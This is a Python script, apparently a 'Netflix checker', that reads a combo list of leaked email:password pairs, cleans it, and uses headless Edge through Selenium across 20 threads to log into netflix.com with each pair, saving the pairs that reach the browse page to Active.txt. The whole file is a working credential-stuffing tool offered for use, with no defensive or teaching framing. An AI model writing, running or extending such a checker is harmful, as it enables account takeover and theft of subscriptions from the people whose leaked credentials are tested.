import sys
import time
from selenium import webdriver
from selenium.webdriver.edge.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
from concurrent.futures import ThreadPoolExecutor, as_completed

# EdgeDriver Path
EDGEDRIVER_PATH = "C:\\Users\\ADMIN\\Downloads\\netflix-checker\\msedgedriver.exe"

# Banner printing function
def print_banner():
    banner = """
____   _________.___.____  __.  _____    _______  ___________.____    ._______  ___
\   \ /   /\__  |   |    |/ _| /  _  \   \      \ \_   _____/|    |   |   \   \/  /
 \   Y   /  /   |   |      <  /  /_\  \  /   |   \ |    __)  |    |   |   |\     / 
  \     /   \____   |    |  \/    |    \/    |    \|     \   |    |___|   |/     \ 
   \___/    / ______|____|__ \____|__  /\____|__  /\___  /   |_______ \___/___/\  \
            \/              \/       \/         \/     \/            \/         \_/
"""
    print(banner)

# Function asks user if they want to run tools
def ask_user():
    while True:
        choice = input("Do you want to run now? (yes/no): ").strip().lower()
        if choice == "yes":
            print("Running...\n")
            time.sleep(1)
            return True
        elif choice == "no":
            print("Existing. Goodbye!")
            sys.exit()
        else:
            print("Invalid selection. Please enter 'yes' or 'no'.")

# Input file cleaning function
def clean_file(input_file, output_file):
    cleaned_accounts = []
    with open(input_file, "r") as infile:
        for line in infile:
            line = line.strip()
            if ":" in line and len(line.split(":")) == 2:
                email, password = line.split(":")
                if email and password:
                    cleaned_accounts.append(f"{email}:{password}")
    with open(output_file, "w") as outfile:
        for account in cleaned_accounts:
            outfile.write(account + "\n")
    print(f"File cleaned. Valid account number: {len(cleaned_accounts)}")

# Netflix account check function
def check_account(account):
    email, password = account.strip().split(":")
    options = webdriver.EdgeOptions()
    options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-extensions")
    options.add_argument("--log-level=3")  # Hide browser logs

    service = Service(EDGEDRIVER_PATH)
    driver = None
    try:
        driver = webdriver.Edge(service=service, options=options)
        driver.get("https://www.netflix.com/login")

        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "userLoginId")))
        driver.find_element(By.NAME, "userLoginId").send_keys(email)
        driver.find_element(By.NAME, "password").send_keys(password + Keys.RETURN)
        time.sleep(3)

        if "browse" in driver.current_url:
            print(f"[+] Valid account: {email}")
            return f"{email}:{password}"
        else:
            print(f"[-] Invalid account: {email}")
    except TimeoutException:
        print(f"[!] Timeout: {email}")
    except WebDriverException as e:
        print(f"[!] Browser error {email}: {str(e)}")
    finally:
        if driver:
            driver.quit()
    return None

# Multithreaded test run function
def process_accounts(input_file, output_file, max_threads=20):
    results = []
    with open(input_file, "r") as file:
        accounts = [line.strip() for line in file if line.strip()]

    with ThreadPoolExecutor(max_threads) as executor:
        futures = [executor.submit(check_account, account) for account in accounts]
        for future in as_completed(futures):
            result = future.result()
            if result:
                results.append(result)

# Write results to file
    with open(output_file, "w") as f:
        for account in results:
            f.write(account + "\n")

    print(f"\nTotal valid accounts: {len(results)}")
    print("The tool has completed all the work. The program will end now..")

# Main function
def main():
    print_banner()
    if ask_user():
        raw_input_file = "combo.txt"
        cleaned_file = "cleaned_combo.txt"
        output_file = "Active.txt"
        max_threads = 20  # Maximum number of threads

# Clean up files
        clean_file(raw_input_file, cleaned_file)

# Run account check tool
        process_accounts(cleaned_file, output_file, max_threads)

if __name__ == "__main__":
    main()
